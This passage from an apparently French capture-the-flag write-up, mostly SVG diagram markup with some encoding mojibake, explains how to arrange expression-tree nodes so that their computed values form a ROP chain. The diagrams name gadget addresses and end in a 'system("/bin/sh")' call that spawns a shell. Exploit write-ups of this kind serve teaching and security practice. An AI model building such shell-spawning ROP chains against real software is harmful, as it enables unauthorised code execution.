<text text-anchor='middle' x='272' y='84' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='272' y='116' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='272' y='148' fill='currentColor' style='font-size:1em'>8</text>
<text text-anchor='middle' x='280' y='20' fill='currentColor' style='font-size:1em'>8</text>
<text text-anchor='middle' x='280' y='52' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='280' y='84' fill='currentColor' style='font-size:1em'>8</text>
<text text-anchor='middle' x='280' y='116' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='280' y='148' fill='currentColor' style='font-size:1em'>6</text>
<text text-anchor='middle' x='288' y='52' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='288' y='116' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='296' y='52' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='296' y='116' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='304' y='52' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='304' y='116' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='368' y='20' fill='currentColor' style='font-size:1em'>&lt;</text>
<text text-anchor='middle' x='368' y='52' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='368' y='84' fill='currentColor' style='font-size:1em'>"</text>
<text text-anchor='middle' x='368' y='116' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='376' y='20' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='376' y='52' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='376' y='84' fill='currentColor' style='font-size:1em'>/</text>
<text text-anchor='middle' x='376' y='116' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='384' y='20' fill='currentColor' style='font-size:1em'>y</text>
<text text-anchor='middle' x='384' y='52' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='384' y='84' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='384' y='116' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='392' y='20' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='392' y='52' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='392' y='84' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='392' y='116' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='400' y='20' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='400' y='52' fill='currentColor' style='font-size:1em'>y</text>
<text text-anchor='middle' x='400' y='84' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='400' y='116' fill='currentColor' style='font-size:1em'>y</text>
<text text-anchor='middle' x='408' y='20' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='408' y='84' fill='currentColor' style='font-size:1em'>/</text>
<text text-anchor='middle' x='416' y='20' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='416' y='52' fill='currentColor' style='font-size:1em'>√†</text>
<text text-anchor='middle' x='416' y='84' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='416' y='116' fill='currentColor' style='font-size:1em'>√†</text>
<text text-anchor='middle' x='424' y='20' fill='currentColor' style='font-size:1em'>&gt;</text>
<text text-anchor='middle' x='424' y='84' fill='currentColor' style='font-size:1em'>h</text>
<text text-anchor='middle' x='432' y='52' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='432' y='84' fill='currentColor' style='font-size:1em'>"</text>
<text text-anchor='middle' x='432' y='116' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='440' y='52' fill='currentColor' style='font-size:1em'>6</text>
<text text-anchor='middle' x='440' y='116' fill='currentColor' style='font-size:1em'>(</text>
<text text-anchor='middle' x='448' y='52' fill='currentColor' style='font-size:1em'>(</text>
<text text-anchor='middle' x='448' y='116' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='456' y='52' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='456' y='116' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='464' y='52' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='464' y='116' fill='currentColor' style='font-size:1em'>)</text>
<text text-anchor='middle' x='472' y='52' fill='currentColor' style='font-size:1em'>)</text>
<text text-anchor='middle' x='480' y='180' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='480' y='196' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='480' y='212' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='480' y='228' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='488' y='180' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='488' y='196' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='488' y='212' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='488' y='228' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='496' y='212' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='496' y='228' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='504' y='180' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='512' y='180' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='512' y='196' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='512' y='212' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='520' y='180' fill='currentColor' style='font-size:1em'>,</text>
<text text-anchor='middle' x='520' y='196' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='520' y='212' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='528' y='180' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='528' y='196' fill='currentColor' style='font-size:1em'>,</text>
<text text-anchor='middle' x='528' y='212' fill='currentColor' style='font-size:1em'>,</text>
<text text-anchor='middle' x='536' y='180' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='536' y='196' fill='currentColor' style='font-size:1em'>8</text>
<text text-anchor='middle' x='536' y='212' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='544' y='180' fill='currentColor' style='font-size:1em'>(</text>
<text text-anchor='middle' x='544' y='196' fill='currentColor' style='font-size:1em'>(</text>
<text text-anchor='middle' x='544' y='212' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='552' y='180' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='552' y='196' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='552' y='212' fill='currentColor' style='font-size:1em'>,</text>
<text text-anchor='middle' x='560' y='180' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='560' y='196' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='560' y='212' fill='currentColor' style='font-size:1em'>3</text>
<text text-anchor='middle' x='568' y='180' fill='currentColor' style='font-size:1em'>)</text>
<text text-anchor='middle' x='568' y='196' fill='currentColor' style='font-size:1em'>)</text>
<text text-anchor='middle' x='568' y='212' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='704' y='196' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='712' y='196' fill='currentColor' style='font-size:1em'>y</text>
<text text-anchor='middle' x='720' y='196' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='728' y='196' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='736' y='196' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='744' y='196' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='752' y='196' fill='currentColor' style='font-size:1em'>(</text>
<text text-anchor='middle' x='760' y='196' fill='currentColor' style='font-size:1em'>"</text>
<text text-anchor='middle' x='768' y='196' fill='currentColor' style='font-size:1em'>/</text>
<text text-anchor='middle' x='776' y='196' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='784' y='196' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='792' y='196' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='800' y='196' fill='currentColor' style='font-size:1em'>/</text>
<text text-anchor='middle' x='808' y='196' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='816' y='196' fill='currentColor' style='font-size:1em'>h</text>
<text text-anchor='middle' x='824' y='196' fill='currentColor' style='font-size:1em'>"</text>
<text text-anchor='middle' x='832' y='196' fill='currentColor' style='font-size:1em'>)</text>
</g>

    </svg>
  
</div>
<p>Etant donn√© que le fonctionnement du programme implique que chaque node repr√©sente le calcul d&rsquo;au moins une de ses filles avec une autre expression (une autre node ou une constante), pour que la node 19 vaille bien <code>0x4141414141414141</code>, il faut que son expression associ√©e soit: <code>&lt;Node_18&gt; + (0x4141414141414141 - 0x400085fa86)</code>, et il nous faut r√©p√©ter cette logique pour toutes les nodes qui composeront notre ROP-chain, voil√† un extrait de l&rsquo;AST correspondant √† la ROP-chain:</p>



<div class="goat svg-container ">
  
    <svg
      xmlns="http://www.w3.org/2000/svg"
      font-family="Menlo,Lucida Console,monospace"
      
        viewBox="0 0 864 457"
      >
      <g transform='translate(8,16)'>
<path d='M 96,0 L 104,0' fill='none' stroke='currentColor'></path>
<path d='M 96,32 L 104,32' fill='none' stroke='currentColor'></path>
<path d='M 160,112 L 168,112' fill='none' stroke='currentColor'></path>
<path d='M 200,128 L 224,128' fill='none' stroke='currentColor'></path>
<path d='M 160,144 L 168,144' fill='none' stroke='currentColor'></path>
<path d='M 208,208 L 216,208' fill='none' stroke='currentColor'></path>
<path d='M 96,224 L 104,224' fill='none' stroke='currentColor'></path>
<path d='M 136,240 L 160,240' fill='none' stroke='currentColor'></path>
<path d='M 536,240 L 544,240' fill='none' stroke='currentColor'></path>
<path d='M 672,240 L 680,240' fill='none' stroke='currentColor'></path>
<path d='M 96,256 L 104,256' fill='none' stroke='currentColor'></path>
<path d='M 264,320 L 272,320' fill='none' stroke='currentColor'></path>
<path d='M 56,336 L 64,336' fill='none' stroke='currentColor'></path>
<path d='M 96,352 L 120,352' fill='none' stroke='currentColor'></path>
<path d='M 56,368 L 64,368' fill='none' stroke='currentColor'></path>
<path d='M 8,192 L 32,144' fill='none' stroke='currentColor'></path>
<path d='M 48,112 L 88,32' fill='none' stroke='currentColor'></path>
<path d='M 48,336 L 88,256' fill='none' stroke='currentColor'></path>
<path d='M 112,224 L 152,144' fill='none' stroke='currentColor'></path>
<path d='M 40,384 L 48,368' fill='none' stroke='currentColor'></path>
<path d='M 72,368 L 96,416' fill='none' stroke='currentColor'></path>
<path d='M 48,144 L 72,192' fill='none' stroke='currentColor'></path>
<path d='M 112,256 L 136,304' fill='none' stroke='currentColor'></path>
<path d='M 112,32 L 152,112' fill='none' stroke='currentColor'></path>
<path d='M 176,144 L 200,192' fill='none' stroke='currentColor'></path>
<polygon points='104.000000,352.000000 92.000000,346.399994 92.000000,357.600006' fill='currentColor' transform='rotate(180.000000, 96.000000, 352.000000)'></polygon>
<polygon points='144.000000,240.000000 132.000000,234.399994 132.000000,245.600006' fill='currentColor' transform='rotate(180.000000, 136.000000, 240.000000)'></polygon>
<polygon points='208.000000,128.000000 196.000000,122.400002 196.000000,133.600006' fill='currentColor' transform='rotate(180.000000, 200.000000, 128.000000)'></polygon>
<path d='M 96,0 A 16,16 0 0,0 80,16' fill='none' stroke='currentColor'></path>
<path d='M 104,0 A 16,16 0 0,1 120,16' fill='none' stroke='currentColor'></path>
<path d='M 80,16 A 16,16 0 0,0 96,32' fill='none' stroke='currentColor'></path>
<path d='M 120,16 A 16,16 0 0,1 104,32' fill='none' stroke='currentColor'></path>
<path d='M 40,112 A 16,16 0 0,0 24,128' fill='none' stroke='currentColor'></path>
<path d='M 40,112 A 16,16 0 0,1 56,128' fill='none' stroke='currentColor'></path>
<path d='M 160,112 A 16,16 0 0,0 144,128' fill='none' stroke='currentColor'></path>
<path d='M 168,112 A 16,16 0 0,1 184,128' fill='none' stroke='currentColor'></path>
<path d='M 24,128 A 16,16 0 0,0 40,144' fill='none' stroke='currentColor'></path>
<path d='M 56,128 A 16,16 0 0,1 40,144' fill='none' stroke='currentColor'></path>
<path d='M 144,128 A 16,16 0 0,0 160,144' fill='none' stroke='currentColor'></path>
<path d='M 184,128 A 16,16 0 0,1 168,144' fill='none' stroke='currentColor'></path>
<path d='M 96,224 A 16,16 0 0,0 80,240' fill='none' stroke='currentColor'></path>
<path d='M 104,224 A 16,16 0 0,1 120,240' fill='none' stroke='currentColor'></path>
<path d='M 80,240 A 16,16 0 0,0 96,256' fill='none' stroke='currentColor'></path>
<path d='M 120,240 A 16,16 0 0,1 104,256' fill='none' stroke='currentColor'></path>
<path d='M 56,336 A 16,16 0 0,0 40,352' fill='none' stroke='currentColor'></path>
<path d='M 64,336 A 16,16 0 0,1 80,352' fill='none' stroke='currentColor'></path>
<path d='M 40,352 A 16,16 0 0,0 56,368' fill='none' stroke='currentColor'></path>
<path d='M 80,352 A 16,16 0 0,1 64,368' fill='none' stroke='currentColor'></path>
<text text-anchor='middle' x='0' y='212' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='16' y='436' fill='currentColor' style='font-size:1em'>¬∑</text>
<text text-anchor='middle' x='24' y='420' fill='currentColor' style='font-size:1em'>¬∑</text>
<text text-anchor='middle' x='32' y='404' fill='currentColor' style='font-size:1em'>¬∑</text>
<text text-anchor='middle' x='40' y='132' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='56' y='356' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='64' y='356' fill='currentColor' style='font-size:1em'>8</text>
<text text-anchor='middle' x='80' y='212' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='96' y='20' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='96' y='244' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='104' y='20' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='104' y='244' fill='currentColor' style='font-size:1em'>9</text>
<text text-anchor='middle' x='136' y='356' fill='currentColor' style='font-size:1em'>N</text>
<text text-anchor='middle' x='144' y='356' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='152' y='324' fill='currentColor' style='font-size:1em'>&lt;</text>
<text text-anchor='middle' x='152' y='356' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='160' y='132' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='160' y='324' fill='currentColor' style='font-size:1em'>g</text>
<text text-anchor='middle' x='160' y='356' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='168' y='132' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='168' y='324' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='176' y='244' fill='currentColor' style='font-size:1em'>N</text>
<text text-anchor='middle' x='176' y='324' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='176' y='356' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='184' y='244' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='184' y='324' fill='currentColor' style='font-size:1em'>g</text>
<text text-anchor='middle' x='184' y='356' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='192' y='244' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='192' y='324' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='192' y='356' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='200' y='244' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='200' y='324' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='200' y='356' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='208' y='324' fill='currentColor' style='font-size:1em'>_</text>
<text text-anchor='middle' x='208' y='356' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='216' y='244' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='216' y='324' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='216' y='356' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='224' y='212' fill='currentColor' style='font-size:1em'>&lt;</text>
<text text-anchor='middle' x='224' y='244' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='224' y='324' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='224' y='356' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='232' y='212' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='232' y='244' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='232' y='324' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='232' y='356' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='240' y='132' fill='currentColor' style='font-size:1em'>N</text>
<text text-anchor='middle' x='240' y='212' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='240' y='244' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='240' y='324' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='248' y='132' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='248' y='212' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='248' y='244' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='248' y='324' fill='currentColor' style='font-size:1em'>&gt;</text>
<text text-anchor='middle' x='248' y='356' fill='currentColor' style='font-size:1em'>q</text>
<text text-anchor='middle' x='256' y='132' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='256' y='212' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='256' y='244' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='256' y='356' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='264' y='132' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='264' y='212' fill='currentColor' style='font-size:1em'>y</text>
<text text-anchor='middle' x='264' y='244' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='264' y='356' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='272' y='212' fill='currentColor' style='font-size:1em'>&gt;</text>
<text text-anchor='middle' x='272' y='244' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='280' y='132' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='280' y='244' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='280' y='324' fill='currentColor' style='font-size:1em'>&lt;</text>
<text text-anchor='middle' x='280' y='356' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='288' y='132' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='288' y='212' fill='currentColor' style='font-size:1em'>Ôºã</text>
<text text-anchor='middle' x='288' y='244' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='288' y='324' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='288' y='356' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='296' y='132' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='296' y='244' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='296' y='324' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='304' y='132' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='304' y='212' fill='currentColor' style='font-size:1em'>&lt;</text>
<text text-anchor='middle' x='304' y='244' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='304' y='324' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='304' y='356' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='312' y='132' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='312' y='212' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='312' y='324' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='312' y='356' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='320' y='132' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='320' y='212' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='320' y='244' fill='currentColor' style='font-size:1em'>q</text>
<text text-anchor='middle' x='320' y='324' fill='currentColor' style='font-size:1em'>y</text>
<text text-anchor='middle' x='320' y='356' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='328' y='132' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='328' y='212' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='328' y='244' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='328' y='324' fill='currentColor' style='font-size:1em'>&gt;</text>
<text text-anchor='middle' x='328' y='356' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='336' y='132' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='336' y='212' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='336' y='244' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='336' y='324' fill='currentColor' style='font-size:1em'>)</text>
<text text-anchor='middle' x='336' y='356' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='344' y='212' fill='currentColor' style='font-size:1em'>h</text>
<text text-anchor='middle' x='352' y='132' fill='currentColor' style='font-size:1em'>q</text>
<text text-anchor='middle' x='352' y='212' fill='currentColor' style='font-size:1em'>_</text>
<text text-anchor='middle' x='352' y='244' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='352' y='356' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='360' y='132' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='360' y='212' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='360' y='244' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='368' y='132' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='368' y='212' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='368' y='356' fill='currentColor' style='font-size:1em'>Ôºã</text>
<text text-anchor='middle' x='376' y='212' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='376' y='244' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='384' y='132' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='384' y='212' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='384' y='244' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='384' y='356' fill='currentColor' style='font-size:1em'>&lt;</text>
<text text-anchor='middle' x='392' y='132' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='392' y='212' fill='currentColor' style='font-size:1em'>&gt;</text>
<text text-anchor='middle' x='392' y='244' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='392' y='356' fill='currentColor' style='font-size:1em'>g</text>
<text text-anchor='middle' x='400' y='212' fill='currentColor' style='font-size:1em'>)</text>
<text text-anchor='middle' x='400' y='244' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='400' y='356' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='408' y='132' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='408' y='244' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='408' y='356' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='416' y='132' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='416' y='356' fill='currentColor' style='font-size:1em'>g</text>
<text text-anchor='middle' x='424' y='132' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='424' y='244' fill='currentColor' style='font-size:1em'>&lt;</text>
<text text-anchor='middle' x='424' y='356' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='432' y='132' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='432' y='244' fill='currentColor' style='font-size:1em'>g</text>
<text text-anchor='middle' x='432' y='356' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='440' y='132' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='440' y='244' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='440' y='356' fill='currentColor' style='font-size:1em'>_</text>
<text text-anchor='middle' x='448' y='244' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='448' y='356' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='456' y='132' fill='currentColor' style='font-size:1em'>&lt;</text>
<text text-anchor='middle' x='456' y='244' fill='currentColor' style='font-size:1em'>g</text>
<text text-anchor='middle' x='456' y='356' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='464' y='132' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='464' y='244' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='464' y='356' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='472' y='132' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='472' y='244' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='472' y='356' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='480' y='132' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='480' y='244' fill='currentColor' style='font-size:1em'>_</text>
<text text-anchor='middle' x='480' y='356' fill='currentColor' style='font-size:1em'>&gt;</text>
<text text-anchor='middle' x='488' y='132' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='488' y='244' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='496' y='132' fill='currentColor' style='font-size:1em'>y</text>
<text text-anchor='middle' x='496' y='244' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='496' y='356' fill='currentColor' style='font-size:1em'>=</text>
<text text-anchor='middle' x='504' y='132' fill='currentColor' style='font-size:1em'>&gt;</text>
<text text-anchor='middle' x='504' y='244' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='512' y='244' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='512' y='356' fill='currentColor' style='font-size:1em'>&lt;</text>
<text text-anchor='middle' x='520' y='132' fill='currentColor' style='font-size:1em'>Ôºã</text>
<text text-anchor='middle' x='520' y='244' fill='currentColor' style='font-size:1em'>&gt;</text>
<text text-anchor='middle' x='520' y='356' fill='currentColor' style='font-size:1em'>g</text>
<text text-anchor='middle' x='528' y='356' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='536' y='132' fill='currentColor' style='font-size:1em'>(</text>
<text text-anchor='middle' x='536' y='356' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='544' y='132' fill='currentColor' style='font-size:1em'>‚àí</text>
<text text-anchor='middle' x='544' y='356' fill='currentColor' style='font-size:1em'>g</text>
<text text-anchor='middle' x='552' y='132' fill='currentColor' style='font-size:1em'>&lt;</text>
<text text-anchor='middle' x='552' y='356' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='560' y='132' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='560' y='244' fill='currentColor' style='font-size:1em'>&lt;</text>
<text text-anchor='middle' x='560' y='356' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='568' y='132' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='568' y='244' fill='currentColor' style='font-size:1em'>g</text>
<text text-anchor='middle' x='568' y='356' fill='currentColor' style='font-size:1em'>_</text>
<text text-anchor='middle' x='576' y='132' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='576' y='244' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='576' y='356' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='584' y='132' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='584' y='244' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='584' y='356' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='592' y='132' fill='currentColor' style='font-size:1em'>y</text>
<text text-anchor='middle' x='592' y='244' fill='currentColor' style='font-size:1em'>g</text>
<text text-anchor='middle' x='592' y='356' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='600' y='132' fill='currentColor' style='font-size:1em'>&gt;</text>
<text text-anchor='middle' x='600' y='244' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='600' y='356' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='608' y='244' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='608' y='356' fill='currentColor' style='font-size:1em'>&gt;</text>
<text text-anchor='middle' x='616' y='244' fill='currentColor' style='font-size:1em'>_</text>
<text text-anchor='middle' x='624' y='244' fill='currentColor' style='font-size:1em'>a</text>
